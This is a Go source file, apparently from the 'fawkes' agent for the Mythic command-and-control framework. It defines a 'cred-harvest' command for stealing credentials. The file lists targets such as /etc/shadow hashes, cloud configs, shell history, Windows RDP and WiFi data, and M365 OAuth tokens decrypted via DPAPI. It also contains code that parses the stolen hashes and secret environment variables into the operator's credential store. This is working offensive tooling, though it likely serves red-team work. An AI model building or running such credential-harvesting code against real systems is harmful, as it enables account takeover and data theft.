package agentfunctions

import (
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "cred-harvest",
		Description:         "Harvest credentials from system files, cloud configs, application secrets, shell history, Windows sources, and M365 OAuth tokens",
		HelpString:          "cred-harvest -action <shadow|cloud|configs|history|windows|m365-tokens|all> [-user <filter>]\nLinux/macOS: shadow, cloud, configs, history, all\nWindows: cloud, configs, windows, m365-tokens, history, all\nhistory: Scan shell history files for leaked passwords, tokens, and API keys\nm365-tokens: Extract OAuth/JWT tokens from TokenBroker, Teams, and Outlook",
		Version:             4,
		MitreAttackMappings: []string{"T1552.001", "T1552.003", "T1552.004", "T1003.008", "T1528"},
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
				agentstructs.SUPPORTED_OS_WINDOWS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "shadow: system password hashes (Unix). cloud: cloud/infra credentials. configs: application secrets. history: scan shell history for leaked credentials. windows: PowerShell history, env vars, RDP, WiFi. m365-tokens: OAuth/JWT from TokenBroker, Teams, Outlook (Windows). all: run all platform-appropriate actions.",
				Choices:          []string{"all", "shadow", "cloud", "configs", "history", "windows", "m365-tokens"},
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
				},
			},
			{
				Name:             "user",
				ModalDisplayName: "User Filter",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Filter results by username (optional)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 1},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData

			// Parse shadow hashes: lines with user:$hash:rest
			if strings.Contains(responseText, "/etc/shadow") || strings.Contains(responseText, "Password Hashes") {
				for _, line := range strings.Split(responseText, "\n") {
					trimmed := strings.TrimSpace(line)
					if !strings.Contains(trimmed, ":$") {
						continue
					}
					parts := strings.SplitN(trimmed, ":", 3)
					if len(parts) < 2 || parts[0] == "" {
						continue
					}
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: "hash",
						Realm:          hostname,
						Account:        parts[0],
						Credential:     parts[1],
						Comment:        "cred-harvest (shadow)",
					})
				}
			}

			// Parse sensitive env vars: lines like VARIABLE=value under "Sensitive Environment Variables"
			if strings.Contains(responseText, "Sensitive Environment Variables") {
				inEnvSection := false
				for _, line := range strings.Split(responseText, "\n") {
					if strings.Contains(line, "Sensitive Environment Variables") {
						inEnvSection = true
						continue
					}
					if inEnvSection && strings.HasPrefix(line, "===") {
						break
					}
					if !inEnvSection {
						continue
					}
					trimmed := strings.TrimSpace(line)
					if idx := strings.Index(trimmed, "="); idx > 0 {
						varName := trimmed[:idx]
						varValue := trimmed[idx+1:]
						if varValue != "" {
							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
								CredentialType: "plaintext",
								Realm:          hostname,
								Account:        varName,
								Credential:     varValue,
								Comment:        "cred-harvest (env)",
							})
						}
					}
				}
			}

			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			user, _ := taskData.Args.GetStringArg("user")

			displayParams := action
			if user != "" {
				displayParams += " (user: " + user + ")"
			}
			response.DisplayParams = &displayParams

			if action == "shadow" || action == "all" {
				createArtifact(taskData.Task.ID, "File Read", "/etc/shadow")
			}
			if action == "history" || action == "all" {
				createArtifact(taskData.Task.ID, "File Read", "~/.bash_history, ~/.zsh_history, ~/.local/share/fish/fish_history")
			}
			if action == "m365-tokens" || action == "all" {
				createArtifact(taskData.Task.ID, "File Read", "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres")
				createArtifact(taskData.Task.ID, "API Call", "CryptUnprotectData (DPAPI)")
			}

			return response
		},
	})
}
